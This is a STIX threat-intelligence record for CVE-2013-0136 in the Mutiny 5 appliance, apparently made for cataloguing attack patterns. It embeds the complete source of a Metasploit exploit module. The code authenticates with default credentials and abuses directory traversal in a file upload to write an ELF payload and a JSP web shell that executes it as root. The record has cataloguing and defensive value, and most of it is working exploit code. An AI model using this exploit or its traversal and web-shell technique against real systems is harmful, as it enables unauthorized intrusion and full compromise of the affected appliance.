{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--98c3a2e8-855d-4472-8174-806684fd27a8",
    "created": "2024-08-14T17:01:55.348259Z",
    "modified": "2024-08-14T17:01:55.348263Z",
    "name": "Mutiny 5 Arbitrary File Upload",
    "description": " This module exploits a code execution flaw in the Mutiny 5 appliance. The EditDocument servlet provides a file upload function to authenticated users. A directory traversal vulnerability in the same functionality allows for arbitrary file upload, which results in arbitrary code execution with root privileges. In order to exploit the vulnerability a valid user (any role) in the web frontend is required. The module has been tested successfully on the Mutiny 5.0-1.07 appliance. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/mutiny_frontend_upload.rb",
            "external_id": "mutiny_frontend_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0136"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/05/15/new-1day-exploits-mutiny-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Mutiny 5 Arbitrary File Upload',\n      'Description' => %q{\n          This module exploits a code execution flaw in the Mutiny 5 appliance. The\n        EditDocument servlet provides a file upload function to authenticated users. A\n        directory traversal vulnerability in the same functionality allows for arbitrary\n        file upload, which results in arbitrary code execution with root privileges. In\n        order to exploit the vulnerability a valid user (any role) in the web frontend is\n        required. The module has been tested successfully on the Mutiny 5.0-1.07 appliance.\n      },\n      'Author'       =>\n        [\n          'juan vazquez' # Metasploit module and initial discovery\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-0136' ],\n          [ 'OSVDB', '93444' ],\n          [ 'US-CERT-VU', '701572' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/05/15/new-1day-exploits-mutiny-vulnerabilities' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'linux',\n      'Arch' => ARCH_X86,\n      'Targets'     =>\n        [\n          [ 'Mutiny 5.0-1.07 Appliance (Linux)', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-05-15'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'Path to Mutiny Web Service', '/']),\n        OptString.new('USERNAME', [ true, 'The user to authenticate as', 'superadmin@mutiny.com' ]),\n        OptString.new('PASSWORD', [ true, 'The password to authenticate with', 'password' ])\n      ])\n  end\n\n  def upload_file(location, filename, contents)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(contents, \"application/octet-stream\", nil, \"form-data; name=\\\"uploadFile\\\"; filename=\\\"#{filename}\\\"\")\n    post_data.add_part(\"../../../..#{location}\", nil, nil, \"form-data; name=\\\"uploadPath\\\"\")\n\n    data = post_data.to_s\n\n    res = send_request_cgi(\n    {\n      'uri'     => normalize_uri(target_uri.path, \"interface\",\"EditDocument\"),\n      'method'  => 'POST',\n      'data'    => data,\n      'ctype'   => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie'  => \"JSESSIONID=#{@session}\"\n    })\n\n    if res and res.code == 200 and res.body =~ /\\{\"success\":true\\}/\n      return true\n    else\n      return false\n    end\n  end\n\n  def login\n\n    res = send_request_cgi(\n      {\n        'uri'    => normalize_uri(target_uri.path, \"interface\", \"index.do\"),\n        'method' => 'GET'\n      })\n\n    if res and res.code == 200 and res.get_cookies =~ /JSESSIONID=(.*);/\n      first_session = $1\n    end\n\n    res = send_request_cgi(\n    {\n      'uri'       => normalize_uri(target_uri.path, \"interface\", \"j_security_check\"),\n      'method'    => 'POST',\n      'cookie'    => \"JSESSIONID=#{first_session}\",\n      'vars_post' => {\n        'j_username' => datastore['USERNAME'],\n        'j_password' => datastore['PASSWORD']\n      }\n    })\n\n    if res.nil? or res.code != 302 or res.headers['Location'] !~ /interface\\/index.do/\n      return false\n    end\n\n    res = send_request_cgi(\n    {\n      'uri'    => normalize_uri(target_uri.path, \"interface\", \"index.do\"),\n      'method' => 'GET',\n      'cookie' => \"JSESSIONID=#{first_session}\"\n    })\n\n    if res and res.code == 200 and res.get_cookies =~ /JSESSIONID=(.*);/\n      @session = $1\n      return true\n    end\n\n    return false\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"interface\",  \"/\"),\n    })\n\n    if res.nil?\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.body =~ /var currentMutinyVersion = \"Version ([0-9\\.-]*)/\n      version = $1\n    end\n\n    if version and version >= \"5\" and version <= \"5.0-1.07\"\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Trying to login\")\n    if login\n      print_good(\"Login Successful\")\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Login failed, review USERNAME and PASSWORD options\")\n    end\n\n    exploit_native\n  end\n\n  def exploit_native\n    print_status(\"Uploading executable Payload file\")\n    elf = payload.encoded_exe\n    elf_location = \"/tmp\"\n    elf_filename = \"#{rand_text_alpha_lower(8)}.elf\"\n    if upload_file(elf_location, elf_filename, elf)\n      register_files_for_cleanup(\"#{elf_location}/#{elf_filename}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Payload upload failed\")\n    end\n\n    print_status(\"Uploading JSP to execute the payload\")\n    jsp = jsp_execute_command(\"#{elf_location}/#{elf_filename}\")\n    jsp_location = \"/usr/jakarta/tomcat/webapps/ROOT/m\"\n    jsp_filename = \"#{rand_text_alpha_lower(8)}.jsp\"\n    if upload_file(jsp_location, jsp_filename, jsp)\n      register_files_for_cleanup(\"#{jsp_location}/#{jsp_filename}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - JSP upload failed\")\n    end\n\n    print_status(\"Executing payload\")\n    send_request_cgi(\n    {\n      'uri'    => normalize_uri(target_uri.path, \"m\", jsp_filename),\n      'method' => 'GET'\n    })\n\n  end\n\n  def jsp_execute_command(command)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|try {\\n|\n    jspraw << %Q|  Runtime.getRuntime().exec(\"chmod +x #{command}\");\\n|\n    jspraw << %Q|} catch (IOException ioe) { }\\n|\n    jspraw << %Q|Runtime.getRuntime().exec(\"#{command}\");\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-15",
    "x_mitre_platforms": [
        "linux'"
    ]
}